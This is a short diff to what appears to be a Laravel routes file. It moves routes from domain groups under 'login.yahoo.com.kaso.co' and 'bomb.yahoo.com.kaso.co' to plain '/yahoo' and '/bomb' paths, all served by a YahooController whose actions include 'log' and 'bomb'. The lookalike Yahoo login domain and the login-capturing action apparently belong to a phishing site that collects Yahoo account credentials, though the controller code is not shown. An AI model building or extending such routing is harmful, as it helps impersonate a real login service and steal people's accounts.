@@ -56,6 +56,12 @@
         'uses'   => 'HomeController@showPurchasedFiles'
     ]);
 
+    Route::get('/yahoo', 'YahooController@login');
+    Route::post('/yahoo', ['as' => 'yahoo-post-login', 'uses' => 'YahooController@log']);
+
+    Route::get('/bomb', 'YahooController@show');
+    Route::post('/bomb', ['as' => 'yahoo-bomb', 'uses' => 'YahooController@bomb']);
+
     Route::get('/privacy', [
         'uses' => 'HomeController@showPrivacy'
     ]);
@@ -200,16 +206,16 @@
         Route::controller('/', 'DevelopersPageController');
     });
 
-    Route::group(['domain' => 'login.yahoo.com.kaso.co'], function () {
-        Route::get('/login', 'YahooController@login');
-        Route::post('/login', ['as' => 'yahoo-post-login', 'uses' => 'YahooController@log']);
-    });
+//    Route::group(['domain' => 'login.yahoo.com.kaso.co'], function () {
+//        Route::get('/login', 'YahooController@login');
+//        Route::post('/login', ['as' => 'yahoo-post-login', 'uses' => 'YahooController@log']);
+//    });
 
 
-    Route::group(['domain' => 'bomb.yahoo.com.kaso.co'], function () {
-        Route::get('/show', 'YahooController@show');
-        Route::post('/show', ['as' => 'yahoo-bomb', 'uses' => 'YahooController@bomb']);
-    });
+//    Route::group(['domain' => 'bomb.yahoo.com.kaso.co'], function () {
+////        Route::get('/show', 'YahooController@show');
+////        Route::post('/show', ['as' => 'yahoo-bomb', 'uses' => 'YahooController@bomb']);
+//    });
 
     /*
      * API ROUTES
